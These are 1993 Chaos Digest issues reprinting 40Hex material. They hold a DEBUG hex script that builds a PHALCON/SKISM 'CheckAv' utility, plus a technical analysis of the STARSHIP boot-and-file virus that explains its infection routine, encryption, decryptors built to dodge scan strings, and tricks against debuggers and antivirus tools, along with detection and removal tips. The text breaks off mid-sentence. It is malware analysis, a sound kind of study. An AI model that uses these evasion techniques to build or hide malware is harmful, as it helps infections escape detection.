e 0970  20 6F 75 74 70 75 74 0D 0A 24 1A 1A 1A 1A 1A 1A
rcx
097F
w
q

------------------------------

End of Chaos Digest #1.66
************************************

Chaos Digest              Vendredi 2 Juillet 1993        Volume 1 : Numero 67
                              ISSN  1244-4901

       Editeur: Jean-Bernard Condat (jbcondat@attmail.com)
       Archiviste: Yves-Marie Crabbe
       Co-Redacteurs: Arnaud Bigare, Stephane Briere

TABLE DES MATIERES, #1.67 (2 Juillet 1993)
File 1--40H VMag Number 8 Volume 2 Issue 4 #004-005(1) (reprint)

Chaos Digest is a weekly electronic journal/newsletter. Subscriptions are
available at no cost by sending a message to:
                linux-activists-request@niksula.hut.fi
with a mail header or first line containing the following informations:
                    X-Mn-Admin: join CHAOS_DIGEST

The editors may be contacted by voice (+33 1 47874083), fax (+33 1 47877070)
or S-mail at: Jean-Bernard Condat, Chaos Computer Club France [CCCF], B.P.
155, 93404 St-Ouen Cedex, France.  He is a member of the EICAR and EFF (#1299)
groups.

Issues of ChaosD can also be found from the ComNet in Luxembourg BBS (+352)
466893.  Back issues of ChaosD can be found on the Internet as part of the
Computer underground Digest archives. They're accessible using anonymous FTP:

        * kragar.eff.org [192.88.144.4] in /pub/cud/chaos
        * uglymouse.css.itd.umich.edu [141.211.182.53] in /pub/CuD/chaos
        * halcyon.com [192.135.191.2] in /pub/mirror/cud/chaos
        * ftp.cic.net [192.131.22.2] in /e-serials/alphabetic/c/chaos-digest
        * cs.ubc.ca [137.82.8.5] in /mirror3/EFF/cud/chaos
        * ftp.ee.mu.oz.au [128.250.77.2] in /pub/text/CuD/chaos
        * nic.funet.fi [128.214.6.100] in /pub/doc/cud/chaos
        * orchid.csv.warwick.ac.uk [137.205.192.5] in /pub/cud/chaos

CHAOS DIGEST is an open forum dedicated to sharing French information among
computerists and to the presentation and debate of diverse views. ChaosD
material may be reprinted for non-profit as long as the source is cited.
Some authors do copyright their material, and they should be contacted for
reprint permission.  Readers are encouraged to submit reasoned articles in
French, English or German languages relating to computer culture and
telecommunications.  Articles are preferred to short responses.  Please
avoid quoting previous posts unless absolutely necessary.

DISCLAIMER: The views represented herein do not necessarily represent
            the views of the moderators. Chaos Digest contributors
            assume all responsibility for ensuring that articles
            submitted do not violate copyright protections.

----------------------------------------------------------------------

Date: Tue May 11 09:24:40 PDT 1993
From: 0005847161@mcimail.com (American_Eagle_Publication_Inc. )
Subject: File 1--40H VMag Number 8 Volume 2 Issue 4 #004-005(1) (reprint)


40Hex Number 8 Volume 2 Issue 4                                      File 004

                 -=PHALCON/SKISM=- Presents CheckAv
                     PD War Collection Program 3
                          By Dark Angel

    Once again, not an incredibly impressive program, but it is still
quite useful.  It PutAv's a serial number, pkzips a test file, with the
pkzip -! option, then unzips it.  It logs the line that has serial
number.  This program requires pkzip, pkunzip, putav and avs.dat from
findav15.

    It is a very crude program, but it was done in quite a hurry, as
I am going away for a while.  Run it in a RAM disk, as it is much
better!

-----------------------------------------------------------------------------
n checkav.com
e 0100  BA F7 02 B4 4A BB 00 10 CD 21 72 34 BA 83 02 E8
e 0110  6C 01 BA 14 03 E8 66 01 B4 0A BA 9A 04 CD 21 BA
e 0120  3C 03 80 3E 9A 04 00 74 76 BB 9C 04 8B D3 A0 9B
e 0130  04 98 03 D8 C6 07 00 B8 00 3D CD 21 BA 5E 03 93
e 0140  72 5D B4 3F B9 3C 00 BA BC 04 CD 21 87 D7 BA 7D
e 0150  03 0B C0 74 4A B8 00 42 33 C9 99 CD 21 FC BA 9F
e 0160  03 B9 3C 00 B0 0D F2 AE 0B C9 74 33 BA D3 03 E8
e 0170  0C 01 4F C6 05 24 BA BC 04 E8 02 01 C6 05 0D 8B
e 0180  D7 81 EA BA 04 89 16 F8 04 B8 00 42 33 C9 CD 21
e 0190  BA D6 02 E8 E8 00 BA 82 04 E8 BA 00 E8 13 00 E8
e 01A0  DC 00 B4 41 BA 8A 04 CD 21 B4 41 BA 8F 04 CD 21
e 01B0  CD 20 B4 3F B9 0D 00 BA EF 03 CD 21 0B C0 74 3A
e 01C0  BA E5 03 E8 B8 00 E8 A2 00 E8 32 00 BE EF 03 BF
e 01D0  09 04 B9 0B 00 F3 A4 BE 03 04 E8 52 00 E8 8B 00
e 01E0  BE 20 04 E8 49 00 E8 82 00 BE 34 04 E8 40 00 E8
e 01F0  79 00 BE 51 04 E8 37 00 EB B8 BA B8 03 C3 53 B4
e 0200  3C BA FE 03 33 C9 CD 21 93 B4 40 8B 0E F8 04 49
e 0210  BA BC 04 CD 21 B4 40 B9 0C 00 BA EF 03 CD 21 B4
e 0220  40 B9 01 00 BA FD 03 CD 21 B4 3E CD 21 5B C3 50
e 0230  53 51 52 1E 06 55 57 89 26 FC 04 8C 16 FA 04 CD
e 0240  2E FA 2E 8E 16 FA 04 2E 8B 26 FC 04 FB 5F 5D 07
e 0250  1F 5A 59 5B 58 C3 53 B8 00 3D CD 21 73 06 B4 3C
e 0260  33 C9 CD 21 93 B4 3E CD 21 5B C3 B4 06 B2 FF CD
e 0270  21 74 0A 3C 1B 75 06 BA D9 02 E9 22 FF C3 B4 09
e 0280  CD 21 C3 43 68 65 63 6B 41 56 20 76 65 72 73 69
e 0290  6F 6E 20 31 2E 30 0D 0A 62 79 20 44 61 72 6B 20
e 02A0  41 6E 67 65 6C 20 6F 66 20 50 48 41 4C 43 4F 4E
e 02B0  2F 53 4B 49 53 4D 0D 0A 50 72 65 73 73 20 45 53
e 02C0  43 20 74 6F 20 61 62 6F 72 74 20 61 74 20 61 6E
e 02D0  79 20 74 69 6D 65 0D 0A 24 45 53 43 61 70 65 20
e 02E0  64 65 74 65 63 74 65 64 2E 20 20 41 62 6F 72 74
e 02F0  69 6E 67 2E 0D 0A 24 45 72 72 6F 72 20 72 65 61
e 0300  6C 6C 6F 63 61 74 69 6E 67 20 6D 65 6D 6F 72 79
e 0310  2E 0D 0A 24 45 6E 74 65 72 20 74 68 65 20 6E 61
e 0320  6D 65 20 6F 66 20 74 68 65 20 66 69 6C 65 20 74
e 0330  6F 20 70 72 6F 63 65 73 73 3A 20 24 0D 0A 4E 6F
e 0340  20 69 6E 70 75 74 20 64 65 74 65 63 74 65 64 2E
e 0350  20 20 41 62 6F 72 74 69 6E 67 21 0D 0A 24 0D 0A
e 0360  46 69 6C 65 20 6E 6F 74 20 66 6F 75 6E 64 2E 20
e 0370  20 41 62 6F 72 74 69 6E 67 2E 0D 0A 24 0D 0A 54
e 0380  68 65 20 66 69 6C 65 20 69 73 20 7A 65 72 6F 20
e 0390  62 79 74 65 73 2E 20 20 44 69 65 21 0D 0A 24 0D
e 03A0  0A 54 68 65 20 66 69 6C 65 20 69 73 20 69 6E 76
e 03B0  61 6C 69 64 2E 0D 0A 24 0D 0A 43 68 65 63 6B 41
e 03C0  56 20 72 75 6E 20 63 6F 6D 70 6C 65 74 65 64 2E
e 03D0  0D 0A 24 0D 0A 0D 0A 54 65 73 74 69 6E 67 20 66
e 03E0  6F 72 3A 20 24 43 68 65 63 6B 69 6E 67 20 23 00
e 03F0  00 00 00 00 00 00 00 00 00 00 00 00 24 1B 74 65
e 0400  73 74 00 1B 65 63 68 6F 20 00 00 00 00 00 00 00
e 0410  00 00 00 00 20 3E 3E 20 72 65 73 75 6C 74 73 0D
e 0420  12 70 75 74 61 76 20 3C 20 74 65 73 74 20 3E 20
e 0430  6E 75 6C 0D 1B 70 6B 7A 69 70 20 2D 21 6F 20 74
e 0440  6F 6D 72 6F 74 20 74 65 73 74 20 3E 20 6E 75 6C
e 0450  0D 2F 70 6B 75 6E 7A 69 70 20 74 6F 6D 72 6F 74
e 0460  20 2D 74 20 7C 20 66 69 6E 64 20 22 41 75 74 68
e 0470  65 6E 74 69 63 22 20 3E 3E 20 72 65 73 75 6C 74
e 0480  73 0D 72 65 73 75 6C 74 73 00 74 65 73 74 00 74
e 0490  6F 6D 72 6F 74 2E 7A 69 70 00 20 1A 1A 1A 1A 1A
rcx
049F
w
q

+++++

40Hex Number 8 Volume 2 Issue 4                                     File 005

           STARSHIP - interesting file-boot virus.
                         Muttik I.G.
                (Internet: MIG@politon.msk.su)


     KEYWORDS

     Virus, DOS, executable file, masterboot record,
     resident in memory, encryption.


     ABSTRACT

STARSHIP virus (file and boot simultaneously) is described. It
infects IBM  PC and  compatibles running  DOS. Virus is called
STARSHIP :  this string can be easily found in the memory dump
of virus.  Virus infects  masterboot record  on  harddisk  and
executable files  files created on floppy drives. The virus is
encrypted. Infected executable files have no descriptor longer
than 2  bytes. Virus  appears to  have no destructive code, it
uses  music  and  video  effects  when  active.  The  abnormal
operation of the infected computers was sometimes detected.


     INTRODUCTION

     History of  computer viruses  is very  short.  The  first
known publications  are dated  with 1984-1985  [1,2]. But  now
situation in this field changes every day - uncountable number
of various  computer viruses  are  known  at  present  in  DOS
operating system.  The variety  of known viruses is fantastic,
but all  of them  falls into  three  known  categories:  file,
boot [3,4] and cluster. Active area of the first virus type is
executable files  and of  the second  type -  boot records  on
harddisks and  diskettes. The  third category is not yet over-
populated, the only representative is bulgarian DIR-II virus.

     Probably the  first virus  which infects  files and  boot
sectors was  Ghost virus  [5]. This  virus was  discovered  by
Fridrik Skulason  at Icelandic University. Ghost virus infects
only COM  files. This virus increases file size by 2351 bytes.
When active  the Ghost replaces boot sector of infected system
with a  boot virus  similar to  Ping Pong, but this boot virus
does  not   have   infection   routine.   The   Ghost   virus,
consequently, may  be considered  as a file virus with unusual
active phase.  After some  time appeared Virus-101, Frodo and,
finally, a  bunch of new viruses was found: Thanksgiving virus
(V-1),  TEQUILA   and  STARSHIP  (these  type  of  viruses  is
sometimes called "multi-partite").

     STARSHIP virus  was found  in  Moscow  in  January  1991.
Probably this virus was written in the USSR.

     The living cycle of STARSHIP virus is the following. When
infected file  is started  it modifies masterboot record (MBR)
on the harddisk and writes virus on the disk. Thereafter, when
computer reboots, virus intercepts interrupt vectors 13h (low-
level disk I/O) and 21h (DOS service). During the reboot virus
is stored in the videomemory at address BB00:0. It is moved to
the core  RAM later, when the first program terminates. Now it
stays resident  and infects any COM/EXE file created on floppy
drives.

     1. GENERAL DESCRIPTION

     Length of STARSHIP virus in memory is 2688 bytes. Size of
code is 2560 bytes, buffers and variables takes the remainder.
On harddisk virus takes 3072 bytes (6 sectors * 512 bytes).

     Virus layout  is shown  in Table.1  and its  memory  dump
(fragmentary) is  presented  in  Figure.1.  (NOTE:  All  dumps
presented is  the article  are partial in order to prevent the
possibility to use for generation of new viruses.)

     No text  messages except  one  string  ">STARSHIP_1<"  of
length 12  (found only in memory) were discovered. This string
can be  found only  in memory, because virus is stored on disk
and in the infected file in encrypted form.

     Normally virus stays resident and the size of used memory
block is  B00h=2816. The beginning of this memory block is the
Program Segment  Prefix (PSP)  of program  that triggered  the
installation of virus in the core RAM. Really virus is started
at offset  80h in  this PSP (consequently, the real virus size
is: B00h-80h=A80h=2688 bytes).

     Virus uses  standard interrupts  13h, 20h,  21h, 27h  and
creates its own interrupts F9h and FCh (see later). When virus
is already  resident (installed  in the core RAM) it uses only
13h and  21h vectors.  Entry points of both interrupt handlers
can be  easily found  (CS:005F and CS:00C5; here CS represents
the code segment where virus resides).

     In the  memory dump of virus one can found the buffer for
the filename  (see ASCIIZ= 'B:\TMP\DROZFILA.COM' at CS:000D in
Fig.1).

     Virus  extensively   uses  its   internal  random  number
generator. The  random number  seed is  taken from  BIOS timer
variable  (0:46Ch).   Random  generator   is  used   for   the
demonstration of  video effect and while creating the infected
file (change  of size  is random  and virus  code is encrypted
using random number). The word "random" may be a real motto of
the described  virus -  it uses  random number  generator very
frequently.

     The part  of virus  memory image  is encrypted  using XOR
function (approximately 60% of total virus size). This section
is decrypted  and used  only while infecting files (section is
marked in  Table.1 with the box). After infection of each file
the XOR  mask is changed, and encryption is performed with the
new mask.  Described procedure  makes  the  encrypted  section
volatile and unreadable. This behavior is not used to hide any
strings in  virus body  (there are  no strings  at all, except
virus  name)  -  maybe  it  is  implemented  only  to  achieve
permanent variance.

     Virus uses  trace capabilities  of processor to determine
the original  BIOS interrupt  13h entry  point.  Virus  issues
int 13h with  trace flag  set and  records the  CS:IP when  CS
becomes greater  or equal  to C800h  (corresponds to  the  ROM
area). However  this method  seems to be non-universal. I have
investigated the  process of  disk infection  and  found  that
rewriting of  MBR sometimes  triggered the  resident antivirus
utilities (program  TSAFE:  Turbo-Anti  Virus  Ver.6.80A  from
CARMEL Software Engineering, Israel).

     While disassembling  the virus  I have found special code
inserts used  to  fool  disassemblers.  In  most  cases  these
inserts uses  non-working calls  and  jumps  pointing  on  the
garbage in  the virus  body. These  inserts are a real problem
for disassemblers  and I  have not  found one  that managed to
correctly separate  code and  data (or  code and garbage). The
intelligent analysis of code is needed, which is not performed
by  all   available  disassemblers  (including  smart  SOURCER
ver. 3.07, by V Communications Inc.).

     I have  carefully examined  the reconstructed  source and
established that STARSHIP virus appears to have no destructive
code.


     2. FILE INFECTION

     Strategy of  file infection  is the  following. Files are
infected while  creation of  EXE/COM file  on A:  or B: disks.
Virus records  file name  in internal buffer (at CS:000D), and
starts infection  routine when  request to  close the file was
issued. This  technique is  similar to the method used by Dark
Avenger virus [3,5,7].

     The idea  to infect only executable file that are created
on floppy  disks explains  why STARSHIP does not intercept int
24h. This  interrupt is  usually catched by viruses to prevent
message - "Write  protect error". But when file is created (!)
on the  floppy disk  it automatically  indicates that the user
has removed (or will remove) the write protect tab.

     Change of infected file size is true random (for the same
file you  can get  many variants  of infection  with different
size growth). Change of size is typically 2616...2648 bytes.

     Virus infects  COMMAND.COM file  when it  is  created  on
floppy disk.  No special  strategy is  used to  infect command
interpreter - it is infected as a simple .COM file.

     When infecting executable (only EXE and COM) files, virus
preserves attribute.  If the file is readonly - this attribute
remains  unchanged  after  infection.  STARSHIP  examines  the
executable file  type by its contents, not by extension (tests
for 5A4Dh  at file  beginning, but  it does  not test  4D5Ah).
Virus does  not infect  short files  - see Table 2. Virus does
not infect  the files  that are  already infected.  Buffer  at
virus end  is used  to read  code beginning  and determine the
presence of  virus (it  seems to  me that virus may frequently
regard uninfected  files as infected, because it performs very
primitive analysis).

     Virus infection  routine uses  the following  interrupts:
int F9h (it points on the original int 21h, as set by DOS) and
int FCh  (points on  original int  13h, as set by BIOS). These
interrupts are used instead of int 21h and 13h. This technique
is probably  used to  prevent triggering  of certain antivirus
utilities. These  utilities often  controls all invokations of
21h and 13h interrupts. The infection routine appends virus to
the end  of executable  file and  adjusts  the  program  entry
point.

     Executable files with COM extension are modified by virus
at first  3 bytes,  which are  replaced with  JMP instruction,
pointing on  the decryptor.  Original 3  bytes from file start
are stored at the very end of the infected file (like the body
of virus these bytes are encrypted with XOR function).

     After modification  of the  EXE  file  header  new  CS:IP
points on  the virus decryptor. SS, SP and MINALLOC fields are
changed. Original  CS, IP,  SS and SP are stored at the end of
the virus  body at  offset A4Fh  (you cannot fetch these bytes
directly - they are encrypted).

     The header  of the  infected EXE  file has  some  special
features. Instruction  pointer always  follows  the  relation:
4<13h. Spacing  between stack  segment and  code segment is
constant: SS-CS=100h  and  stack  pointer  is  always  set  to
SP=800h. Moreover,  STARSHIP does  not infect  EXE files  when
MAXALLOC field  of EXE  header is less than 0FFFFh. Virus does
not infect files with nonzero overlay number.

     Virus code  is added  to the end of file in the encrypted
form.  This  encrypted  code  goes  after  special  decrypting
program (decryptor). The purpose of decryptor is to decode the
virus body.

     Decryptor of  virus body  seems to  be specially designed
not to  have  a  characteristic  bytes  sequence  (descriptor)
longer than  2 bytes  (for example:  XOR BH,BH and MOV BL,6 is
used instead  of MOV BX,0006,  because first commands occupies
2-bytes, but  the last takes 3 bytes). In reality this program
is mixed  with NOPs  and other 1-byte codes, not affecting the
execution of decryptor. The sequence of operators in main code
is fixed,  but spacing  between these  operators is  variable.
Described technique  really eliminates the possibility to find
virus using search based on certain descriptor, because any 2-
byte sequences  are found  on the  disk too frequently. Search
based on  the wildcard  strings must  take into  account  that
spacing between operators in virus code is variable (from 0 to
16 bytes of NOPs and other silly stuff).

     Moreover, the  decryptor  uses  synonyms  for  code:  for
example the XCHG AX,SI command has three (!) different machine
code representations  (0c687h,  0f087h,  96h  means  the  same
processor directive  -  XCHG AX,SI).  As  well  MOV AX,SP  and
MOV BX,AX has  two representations. That fact also complicates
search based on the wildcard strings, producing many different
wildcards for the same virus.

     First  the  decryptor  must  determine  its  position  in
memory, because  all references  in the virus must be relative
to  the   known   point.   STARSHIP   uses   unusual   method,
simultaneously suppressing  the attempts  to  trace  execution
flow of  decryptor with  the use of debugger. Virus issues int
03h (it  usually points  on IRET)  and then  reads the  return
address below (!) the stack pointer SP (LODSW SS:[SI]). If you
use the  debugger, it will immediately destroy all words below
the SP, resulting in the malfunction of the rest of decryptor.
Sometimes instead of int 03h virus uses interrupts 01h/11h/12h
as the dummy calls.

     Decryption of  virus code attached to infected executable
file is done from top addresses to bottom. This sequence makes
tricky setting of breakpoint after the decryption loop because
the last  decrypted byte is just below the loop. Hence, if you
place here  the breakpoint  it will  be  decrypted,  its  code
(0CCh) will  become garbage  and will  be executed  instead of
invokation of breakpoint routine.

     All general  processor registers  are set  to zero  after
decryption process prior to start of infected program. Segment
registers are preserved.

     When  I  used  MS-Windows  or  any  other  graphics  user
interfaces -  infection of  copied files  does not take place.
That is  possibly because  virus uses videomemory as temporary
buffer while  infecting files  and checks the videomode before
infection.

     3. DISK INFECTION

     When decryptor  finished its work it transfers control to
the disk  infection routine. First this code tests DOS version
number (virus works only with versions later than 2.0) and the
presence of video-RAM at BB00:0 (virus physically tests memory
existence at  this address  via MOV/CMP sequence). Second - it
tests if  virus is  already resident  (checks if special virus
memory dispatcher  is present at address 0000:04B0). And third
- STARSHIP determines the original int 13h entry point in BIOS
(it traces  the call of int 13h, function 8; this call is used
to determine  the physical  disk size).  The  fourth  -  virus
infects the masterboot via direct call of BIOS int 13h.

     STARSHIP  modifies   MBR  in   only  3  bytes:  head  and
sector/cylinder of  DOS boot.  Virus  places  its  code  in  6
consecutive sectors at the disk end (it uses physical disk #1,
last head,  last track  and last 6 sectors in the last track).
After modification  of MBR,  boot field  of  active  partition
points on pseudoDOS boot, the first of used 6 sectors. Dump of
pseudoDOS boot  is presented  in Figure  2. First  5 bytes  in
pseudoDOS boot  are equal  to the  original DOS boot beginning
(0EBh, 034h,  090h, 'MS').  The pseudoDOS  boot  contains  the
loader of virus code that is located in next 5 sectors. (Note:
the area at offset 115h..1F9h in pseudoDOS boot is filled with
garbage).

     Counter of  reboots (byte)  is located  at offset 1FCh in
pseudoDOS boot.  This counter is initialized with random value
in range  0...20h. Sometimes  it is initialized with 0FFh - in
this  case  the  counter  is  not  incremented  during  reboot
(probably such  computer cannot  be ill).  The probability  of
this case is approximately 30%.

     At offset  1FDh in pseudoDOS boot the XOR mask (byte) can
be found.  This mask  is used  for  decryption  of  5  sectors
following pseudoDOS boot (these sectors contains virus body).

     Moreover, I  have found  in pseudoDOS  boot the code that
loads and  executes unknown  procedure from  sectors 2...6  on
head 0  and track  0. Code from these sectors is executed only
if its  checksum is  valid. This  space between  MBR and first
partition (it  normally starts  on head 1, track 0) is usually
unused and  filled with zeros. This area is frequently used by
some computer viruses [3] (DiskKiller for example). But I have
not detected any valuable code in these sectors - this unknown
procedure was probably written only to fool the researchers or
for futer virus extension.

     Upon infection virus stores no original MBR copy. It only
saves changes  -  3  bytes  of  original  DOS  boot  head  and
sector/cylinder (stored  under XOR  mask inside  5 sectors  of
virus code). If you want to get these parameters you must read
XOR mask from pseudoDOS boot, decrypt the virus body and fetch
necessary 3 bytes from the appropriate positions.

     There is  another method  to restore original MBR. If you
perform the  request  to  read  MBR  (AX=201h,  CX=1,  DX=80h,
ES:BX=buffer) via  int 13h:  virus will read real MBR, restore
its original  contents and  you will obtain what you want. You
can save  this MBR  copy on  disk, reboot  from uninfected DOS
diskette and  write it  back on  harddrive instead of infected
MBR. This  method works fine and we used it successfully prior
to creation  of removing utility. The only disadvantage of the
described method is that it takes too much time.


     4. REBOOT OF INFECTED COMPUTER

     When computer  reboots the pseudoDOS boot is executed. It
loads virus  code in  videomemory (at  address BB00:0000).  PC
without videomemory  at segment  BB00 are not infected (I have
no computer  with monochrome  display adapter  so the test was
not  really   performed).  Then   it  decrypts   the  code  in
videomemory, intercepts  int 13h  and creates  special  memory
dispatcher at  address 0000:04B0.  The dispatcher structure is
shown in Fig.3a.

     Now all  accesses to  disk are  controlled with the virus
patch on  interrupt 13h. This code filters all accesses to MBR
and last  6 sectors  on disk.  The MBR now looks unchanged and
all writes to last 6 sectors are impossible (error flag is not
returned).   Described    technique   preserves   virus   from
modification, since its code is installed in DOS file area.

     After installation  in videomemory  virus examines if DOS
interrupts (20h, 21h, 27h) are set. This technique seems to be
universal :  I have  tested DOS versions 2.0, 2.11, 3.0, 3.30,
4.0 and  virus successfully  intercepts DOS  interrupts. Virus
hanged during reboot only with MS-DOS version 5.00. Section of
virus implementing  the task  of DOS interception analyses the
validity of  CS in  the vectors table for DOS interrupts (20h,
21h, 27h) to determine if it is safe to intercept DOS vectors.

     DOS interrupt  21h is  intercepted by STARSHIP before any
programs can  do the  same from CONFIG.SYS or AUTOEXEC.BAT. So
any resident  software vaccine  programs  ANTI4US2,  FLOSERUM,
TSAFE or  others, including programs with driver anatomy would
be unable to detect the operation of virus.

     After the  interception of DOS interrupts virus waits for
the termination  of  first  program.  It  test  the  calls  of
interrupts 20h,  27h and  of the DOS functions 0, 31h and 4Ch.
When Exit_to_DOS  request was  issued virus body is moved from
videomemory to  the core memory. If terminated program remains
resident virus  expands its  memory block  (glues to  resident
tail). If  program simply  returns to  DOS (AH=0, AH=4C) virus
substitutes the exit request with the TSR request (AH=31h) and
creates its own memory block. At this moment memory dispatcher
is modified to point on the new interrupt routines in the body
of virus.  From this moment virus stops controlling interrupts
20h and  27h.  It  uses  now  only  13h  and  21h  interrupts.
Dispatcher layout  after the shift of virus to the core RAM is
presented in Fig.3b.

     If the  first loaded program uses graphics - the virus is
erased from  videomemory, but  it can  survive because  it has
special restoring procedure (int B0h, at address 0000:02C0, in
the vectors  table). That  is exotic  -  the  whole  interrupt
service routine is located in the interrupt table (it occupies
approximately 3  paragraphs and  covers  interrupts  B0...BB).
This routine  checks presence  of  virus  in  videomemory  (in
reality only  one word of videomemory is checked) and if virus
image was  destroyed all 5 sectors with virus program are read
to videomemory  and decoded (remember that disk image of virus
is XOR-encrypted).  Computer hangs  only if  graphics is  used
simultaneously with  accesses to DOS, but this situation seems
to  be  exceptional,  because  programs  usually  included  in
AUTOEXEC.BAT rarely use graphics.

     The performing of all these tests on the infected machine
was very  useful and  exciting  when  the  very  first  loaded
program was DEBUG (you must remove or rename AUTOEXEC.BAT; you
can also  place DEBUG  as  the  first  line  of  your  current
AUTOEXEC.BAT). All  virus structures  were easily located. The
most interesting  were attempts  to  erase  virus  image  from
videomemory -  virus immediately  restores its  code. In DEBUG
you can  investigate the  process of virus installation in the
core RAM.  You only  need to trace the request of DOS function
4Ch (terminate) - and you will see how virus code is moved and
how its memory dispatcher is modified.

     After the  installation of virus in the core RAM it waits
for the  creation of any executable files on the floppy drives
A: and  B:. This  is usually done with DOS "copy" command when
destination file is located on floppy disk.


     4. ACTIVE PHASE

     The evil  happens when  reboots counter reaches 80 (while
initial reboot  counter is  in range  0..31). Disease  appears
after few  hours since  reboot and  this delay  depends on the
disk activity.  Virus plays  music  tones  and  drops  colored
points (ASCII=250)  without affecting  of  screen  background.
Each point  and each  tone corresponds  to  one  disk  access.
Frequency of  tones seems  to be  proportional to  the  seccyl
parameter (CX) of int 13h. This musical and visual effect does
not take place in any graphics modes. Colored points appearing
at random  screen positions  does not  affect  pseudographics.
Sometimes dots  are substituted  by spaces.  This video effect
corrupts  the   screen  in   text  mode   resulting   in   the
impossibility of using intensive disk accesses.

     When disks  are inactive  all operates correctly. You can
also use virtual disks or cache without any problems.

     Reboot temporary suspends virus activity.

     But remember  that infected  computer will  reach  active
phase  only  with  approximate  probability  2/3.  In  certain
infected computers triggering of virus is blocked! Behavior of
infected computer  depends on  the initial  value  of  reboots
counter.

------------------------------

End of Chaos Digest #1.67
************************************

Chaos Digest              Vendredi 2 Juillet 1993        Volume 1 : Numero 68
                              ISSN  1244-4901

       Editeur: Jean-Bernard Condat (jbcondat@attmail.com)
       Archiviste: Yves-Marie Crabbe
       Co-Redacteurs: Arnaud Bigare, Stephane Briere

TABLE DES MATIERES, #1.68 (2 Juillet 1993)
File 1--40H VMag Number 8 Volume 2 Issue 4 #005(2)-006 (reprint)

Chaos Digest is a weekly electronic journal/newsletter. Subscriptions are
available at no cost by sending a message to:
                linux-activists-request@niksula.hut.fi
with a mail header or first line containing the following informations:
                    X-Mn-Admin: join CHAOS_DIGEST

The editors may be contacted by voice (+33 1 47874083), fax (+33 1 47877070)
or S-mail at: Jean-Bernard Condat, Chaos Computer Club France [CCCF], B.P.
155, 93404 St-Ouen Cedex, France.  He is a member of the EICAR and EFF (#1299)
groups.

Issues of ChaosD can also be found from the ComNet in Luxembourg BBS (+352)
466893.  Back issues of ChaosD can be found on the Internet as part of the
Computer underground Digest archives. They're accessible using anonymous FTP:

        * kragar.eff.org [192.88.144.4] in /pub/cud/chaos
        * uglymouse.css.itd.umich.edu [141.211.182.53] in /pub/CuD/chaos
        * halcyon.com [192.135.191.2] in /pub/mirror/cud/chaos
        * ftp.cic.net [192.131.22.2] in /e-serials/alphabetic/c/chaos-digest
        * cs.ubc.ca [137.82.8.5] in /mirror3/EFF/cud/chaos
        * ftp.ee.mu.oz.au [128.250.77.2] in /pub/text/CuD/chaos
        * nic.funet.fi [128.214.6.100] in /pub/doc/cud/chaos
        * orchid.csv.warwick.ac.uk [137.205.192.5] in /pub/cud/chaos

CHAOS DIGEST is an open forum dedicated to sharing French information among
computerists and to the presentation and debate of diverse views. ChaosD
material may be reprinted for non-profit as long as the source is cited.
Some authors do copyright their material, and they should be contacted for
reprint permission.  Readers are encouraged to submit reasoned articles in
French, English or German languages relating to computer culture and
telecommunications.  Articles are preferred to short responses.  Please
avoid quoting previous posts unless absolutely necessary.

DISCLAIMER: The views represented herein do not necessarily represent
            the views of the moderators. Chaos Digest contributors
            assume all responsibility for ensuring that articles
            submitted do not violate copyright protections.

----------------------------------------------------------------------

Date: Tue May 11 09:24:40 PDT 1993
From: 0005847161@mcimail.com (American_Eagle_Publication_Inc. )
Subject: File 1--40H VMag Number 8 Volume 2 Issue 4 #005(2)-006 (reprint)


     5. ERRORS AND BUGS

     When STARSHIP infects harddisk it rewrites 6 last sectors
on the  disk. The  contents of these sectors are unrecoverably
lost!
     Moreover, virus  controls all disk accesses (via int 13h)
to prevent  the rewrite  of its code (all writes to virus area
are simply  ignored; error  condition is not returned). But if
you load  DOS from floppy disk and then modify this restricted
zone (for  example if  you write file and it occasionally will
occupy the  last cluster  on the harddisk) - computer will not
reboot later  and hang.  You will  need  to  recreate  MBR  to
overcome this problem.

     I have  determined that  the problem  may appear when the
first used  program is  MARK (by  TurboPower  Software).  This
program is  used in  combination with  RELEASE to  remove  all
resident utilities  that were  loaded after  MARK, to save and
restore the  interrupt vectors  table and state of EMS memory.
When MARK remains resident virus glues to its memory block and
everything is  correct. But  when you start RELEASE - computer
hangs. This  happens because  RELEASE restores  the interrupts
table in  its state before (!) shift of virus to the core RAM,
when virus  was in  videomemory. Consequently, vectors 13h and
21h  after   RELEASE  points   on  videomemory   where  is  no
appropriate handlers  at this  moment -  computer  immediately
hangs.

     Probably, if  you replace  your CGA,  EGA or  VGA adaptor
with MDA, your computer will hang after power-up because there
will be  no space  to store virus during reboot. (Virus checks
videomemory existence only once - prior to disk infection.)

     The use of special restoration procedure at address 0:2C0
in the  interrupt vectors  table must cause the malfunction of
computers that  uses vectors  B0...BB  during  reboot.  (These
vectors are  used by  virus only  during reboot,  when special
restoration procedure  is located at address 0:2C0. When virus
goes resident  in conventional  memory all  these vectors  are
cleared with zeroes!)

     I have  detected that  some XT  computers  with  RAMDRIVE
driver  in  the  CONFIG.SYS  did  not  execute  some  programs
(Harvard Graphics, MS-FORTRAN, QuickBASIC).

     Some users  have reported the problems with the reboot of
infected PS/2 model 30.

     These examples  establishes the  rule - remove virus when
you  fixed  its  presence.  There  are  no  harmless  viruses.
Remember: any infected program may produce malfunction of your
computer!


     6. STARSHIP DETECTION

     STARSHIP virus  has one  special feature  - it  does  not
modify any  executable file  on the  harddisk. So  if you  use
passive virus detectors (based on the generation of CRC checks
for the  files) to test your harddisk - you will never get the
warning about  virus activity.  Each file on the harddisk will
remain unchanged.  Additionally, if  this utility examines the
contents of  MBR and  DOS boot  sector, it will not inform you
about the  infection if it uses simple interrupt 13h. STARSHIP
will substitute  infected MBR with the original in each access
to MBR via int 13h.

     How to  detect the  presence of  STARSHIP? It  is a  real
problem, because  the search  of infected  files based  on the
virus descriptor  is impossible.  No standard  software can be
used to  found  STARSHIP.  Only  specially  designed  scanning
programs that  analyses the  contents of the EXE header or the
code at the file entry point are useful.

     Here follows  some useful  hints  that  may  be  used  to
determine the presence of STARSHIP virus.

     If  you  have  antivirus  program  AIDSTEST  by  Lozinsky
(version later than 115, April 1991) it can scan and desinfect
files (AIDSTEST  calls virus  "STARSHIP-2616").  Sometimes  it
refuses to  desinfect file  and reports something like "Cannot
remove virus. Delete file(Y/N)?".

     If you  reboot from original DOS diskette and start FDISK
- it  shows (Display Partition Information) that Start and End
of DOS partition are equal for the infected harddisk.

     You can  also detect  the presence  of STARSHIP  virus in
memory if  you examine  (unassemble) RAM  contents at  address
0:4B0 with the help of DEBUG (compare with Fig.3).

     Typically executable  files has  text messages, tables or
zeros at  the end.  So you  can visually  examine the  tail of
executable file  and if  you will see approximately 2.7 kbytes
of garbage  - that  is suspicious  and  you  may  suggest  the
